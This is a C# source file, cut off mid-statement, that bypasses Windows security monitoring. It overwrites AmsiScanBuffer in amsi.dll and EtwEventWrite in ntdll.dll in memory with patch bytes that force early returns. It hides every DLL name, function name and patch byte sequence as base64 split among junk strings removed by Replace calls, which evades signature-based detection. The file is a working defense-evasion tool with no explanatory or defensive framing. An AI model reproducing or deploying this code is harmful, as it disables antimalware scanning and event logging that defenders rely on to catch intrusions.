using System;

using System.Runtime.InteropServices;
using System.Text;

namespace AmsiEtw
{
    public class Program
    {
        public static void Main()
        {
            if (Is64Bit())
            {
                PatchMemory(DecodeBase64(Split.NameDllAmsi()), DecodeBase64(Split.FonctionAmsi()),
                    Convert.FromBase64String(Split.X64PatchAmsi()));
                PatchMemory(DecodeBase64(Split.NameDllEtw()), DecodeBase64(Split.FonctionEtw()),
                    Convert.FromBase64String(Split.X64PatchEtw()));
            }

            PatchMemory(DecodeBase64(Split.NameDllAmsi()), DecodeBase64(Split.FonctionAmsi()),
                Convert.FromBase64String(Split.X86PatchAmsi()));
            PatchMemory(DecodeBase64(Split.NameDllEtw()), DecodeBase64(Split.FonctionEtw()),
                Convert.FromBase64String(Split.X86PatchEtw()));
        }

        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
        {
            IntPtr library = Win32.DelegateLoadLibrary(ref nameDll);
            IntPtr procAddress = Win32.DelegateGetProc(library, ref nameFonction);
            uint output;
            Win32.VirtualAllocEx(procAddress, (IntPtr)patch.Length, 0x40, out output);
            Marshal.Copy(patch, 0, procAddress, patch.Length);
        }

        protected static bool Is64Bit()
        {
            if (IntPtr.Size == 8)
            {
                return true;
            }

            return false;
        }

        protected static String DecodeBase64(string input)
        {
            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
        }
    }

    internal class Win32
    {
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hProcess,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        private static TCreateApi LoadApi<TCreateApi>(string name, string method)
        {
            var input = (TCreateApi)((object)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(LoadLibraryA(ref name), ref method), typeof(TCreateApi)));
            return input;
        }

        //VirtualProtect
        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32",
            Encoding.Default.GetString(Convert.FromBase64String(Split.VirtualProtect())));

        public delegate int DelegateVirtualProtect(IntPtr lpAddress, IntPtr dwSize, int flNewProtect,
            out uint lpflOldProtect);

        //LoadLibraryA
        public static readonly DelegateLoadLibraryA DelegateLoadLibrary = LoadApi<DelegateLoadLibraryA>("kernel32",
            Encoding.Default.GetString(Convert.FromBase64String(Split.LoadLibraryA())));

        public delegate IntPtr DelegateLoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

        //GetProcAddress
        public static readonly DelegateGetProcAddress DelegateGetProc = LoadApi<DelegateGetProcAddress>("kernel32",
            Encoding.Default.GetString(Convert.FromBase64String(Split.GetProcessAdress())));

        public delegate IntPtr DelegateGetProcAddress(IntPtr hProcess,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
    }

    static class Split
    {
        public static string NameDllEtw()
        {
            string input = "";
            input +=
                "Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5bnRkJzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5"
                    .Replace("Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5", "");
            input +=
                "Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5bGwuJzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5"
                    .Replace("Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5", "");
            input +=
                "Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5ZGxsJzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5"
                    .Replace("Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5", "");

            return input;
        }

        public static string FonctionEtw()
        {
            string input = "";
            input +=
                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOERXR3SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
                    .Replace(
                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
                        "");
            input +=
                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOERXZlSC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
                    .Replace(
                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
                        "");
            input +=
                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOEbnRXSC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
                    .Replace(
                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
                        "");
            input +=
                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOEcml0SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
                    .Replace(
                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
                        "");
            input +=
                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOEZQ==SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
                    .Replace(
                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
                        "");

            return input;
        }

        public static string X64PatchEtw()
        {
            string input = "";
            input +=
                "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6SDPA3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6"
                    .Replace(
                        "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6",
                        "");
            input +=
                "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6ww==3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6"
                    .Replace(
                        "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6",
                        "");

            return input;
        }

        public static string X86PatchEtw()
        {
            string input = "";
            input +=
                "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPBM8DC5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB"
                    .Replace(
                        "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB",
                        "");
            input +=
                "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPBFAA=5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB"
                    .Replace(
                        "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB",
                        "");

            return input;
        }

        public static string NameDllAmsi()
        {
            string input = "";
            input += "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBTYW1zEoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT".Replace(
                "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT", "");
            input += "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBTaS5kEoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT".Replace(
                "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT", "");
            input += "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBTbGw=EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT".Replace(
                "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT", "");

            return input;
        }

        public static string FonctionAmsi()
        {
            string input = "";
            input +=
                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMQW1zMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
            input +=
                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMaVNjMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
            input +=
                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMYW5CMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
            input +=
                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMdWZmMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
            input +=
                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMZXI=MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");

            return input;
        }

        public static string X64PatchAmsi()
        {
            string input = "";
            input +=
                "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqLuFcAt0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL"
                    .Replace(
                        "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL",
                        "");
            input +=
                "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqLB4DDt0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL"
                    .Replace(
                        "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL",
                        "");

            return input;
        }

        public static string X86PatchAmsi()
        {
            string input = "";
            input +=
                "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnCuFcArpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC"
                    .Replace(
                        "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC",
                        "");
            input +=
                "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnCB4DCrpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC"
                    .Replace(
                        "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC",
                        "");
            input +=
                "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnCGAA=rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC"
                    .Replace(
                        "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC",
                        "");

            return input;
        }

        public static string VirtualProtect()
        {
            string input = "";
            input +=
                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfVmlyed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
                    .Replace(
                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
                        "");
            input +=
                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfdHVhed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
                    .Replace(
                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
                        "");
            input +=
                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfbFByed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
                    .Replace(
                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
                        "");
            input +=
                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfb3Rled34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
                    .Replace(
                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
                        "");
            input +=
                "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cfY3Q=ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf"
                    .Replace(
                        "ed34gJKKNnk4zvWetQq6u07hOuPPIN5UWzKB0sgAj99XpIoGXpkmBYQofWqv45BArPhAkVnBuqWu0k2GGI1cmTT8igfeBuFo89pZkngCCi1UCgx5dkowDjYY6jbD0JA9lsw14cf",
                        "");

            return input;
        }

        public static string LoadLibraryA()
        {
            string input = "";
            input +=
                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfTG9he9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
                    .Replace(
                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
                        "");
            input +=
                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfZExpe9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
                    .Replace(
                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
                        "");
            input +=
                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfYnJhe9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
                    .Replace(
                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
                        "");
            input +=
                "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCfcnlBe9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf"
                    .Replace(
                        "e9G0QZ9ucZos0gPoapidsM5zNuoPPMIQpZk5wQ8VAD5F01CnRNKdcMKRDRnfvuePQXDa5T2JrMdoR08VsB7CBoxcPS2fnckPjpydylr7VAwQtfAMSRxuwcOmjkLmaXgOlNFlCf",
                        "");
            return input;
        }

        public static string GetProcessAdress()
        {
            string input = "";
            input +=
                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1R2V0SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
                        "");
            input +=
                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1UHJvSArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
                        "");
            input +=
